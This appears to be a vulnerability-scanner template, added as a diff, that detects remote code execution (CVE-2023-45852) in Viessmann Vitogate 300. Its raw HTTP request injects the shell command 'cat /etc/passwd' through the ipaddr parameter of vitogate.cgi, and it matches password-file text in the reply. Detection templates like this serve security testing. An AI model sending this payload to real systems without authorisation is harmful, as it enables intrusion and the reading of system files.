@@ -1,0 +1,36 @@
+id: cve-2023-45852
+info:
+  name: Viessmann Vitogate Remote Code Execution (CVE-2023-45852)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,cve-2023-45852
+  description: |
+    This template detects remote code execution vulnerability in Viessmann Vitogate 300 through the vitogate.cgi endpoint.
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/vitogate.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"1;cat /etc/passwd"}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "traceinfo"
+
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
